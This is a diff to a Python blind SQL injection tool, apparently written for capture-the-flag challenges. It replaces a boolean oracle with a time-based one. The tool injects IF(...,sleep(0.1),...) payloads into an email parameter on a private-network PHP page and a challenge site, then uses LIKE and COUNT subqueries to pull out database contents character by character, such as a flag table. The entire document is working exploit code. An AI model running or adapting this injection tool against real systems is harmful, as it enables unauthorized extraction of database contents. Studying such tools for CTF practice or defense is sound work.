@@ -9,7 +9,7 @@ alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789 /?.,<>;:'"`[]{}\\~!@#$%^&*()-_=
 
 
 def main():
-    print(enum_data_for_table(('secret_db', 'flag_table'), ('secret_db', 'flag_table', 'flag')))
+    enum_all()
 
 
 def enum_selected():
@@ -52,13 +52,11 @@ def make_query(payload: str) -> bool:
     # print(payload)
 
     start = time.time()
-    # r = requests.get(f"http://10.10.10.10/newsletter.php?name=t&email=t' OR IF({format_payload(payload)}, sleep(0.1), 'NO') AND '1'='1")
-    r = requests.post("https://r0.nzcsc.org.nz/challenge7/", data=f"firstn=a%27+OR+{url_encode(payload)}+--+&subit=Check", headers={'Content-Type': 'application/x-www-form-urlencoded'})
+    r = requests.get(f"http://10.102.1.17/regards.php?email=t' OR IF({url_encode(payload)},sleep(0.1),'NO') AND '1'='1")
+    # r = requests.post("https://r0.nzcsc.org.nz/challenge7/", data=f"firstn=a%27+OR+{url_encode(payload)}+--+&subit=Check", headers={'Content-Type': 'application/x-www-form-urlencoded'})
     end = time.time()
 
-    # if "yes" in r.text:        # boolean example
-    # if end - start >= 0.1:     # blind example
-    if "No rows returned" not in r.text:
+    if end - start >= 0.1:     # blind example
         # print(f'T {payload}')
         return True
     else:
@@ -86,7 +84,7 @@ class AlreadyKnowns:
         return result
 
 
-def make_like_query(table_name: Union[tuple, str], col_name: Union[tuple, str], likened_value: str, already_knowns: AlreadyKnowns = None, threshold_n: int = 0) -> bool:
+def make_like_query(table_name: Union[tuple, str], col_name: str, likened_value: str, already_knowns: AlreadyKnowns = None, threshold_n: int = 0) -> bool:
     payload = f"(SELECT COUNT(*) FROM `{escape_sql(table_name)}` WHERE `{escape_sql(col_name)}` LIKE '{escape_sql(likened_value, True)}%'"
 
     if already_knowns is not None:
@@ -96,7 +94,7 @@ def make_like_query(table_name: Union[tuple, str], col_name: Union[tuple, str], 
     return make_query(payload)
 
 
-def make_match_query(table_name: Union[tuple, str], col_name: Union[tuple, str], exact_value: str, already_knowns: AlreadyKnowns = None) -> bool:
+def make_match_query(table_name: Union[tuple, str], col_name: str, exact_value: str, already_knowns: AlreadyKnowns = None) -> bool:
     payload = f"(SELECT COUNT(*) FROM `{escape_sql(table_name)}` WHERE `{escape_sql(col_name)}`='{escape_sql(exact_value)}'"
 
     if already_knowns is not None:
@@ -106,7 +104,7 @@ def make_match_query(table_name: Union[tuple, str], col_name: Union[tuple, str],
     return make_query(payload)
 
 
-def enum_data_for_table(table_name: Union[tuple, str], col_name: Union[tuple, str], data_found: List[str] = None, previous_guess: str = "", only_one_left=False, already_knowns: AlreadyKnowns = None) -> List[str]:
+def enum_data_for_table(table_name: Union[tuple, str], col_name: str, data_found: List[str] = None, previous_guess: str = "", only_one_left=False, already_knowns: AlreadyKnowns = None) -> List[str]:
     if data_found is None:
         data_found = []
     if not only_one_left and not make_like_query(table_name, col_name, previous_guess, already_knowns, threshold_n=1):
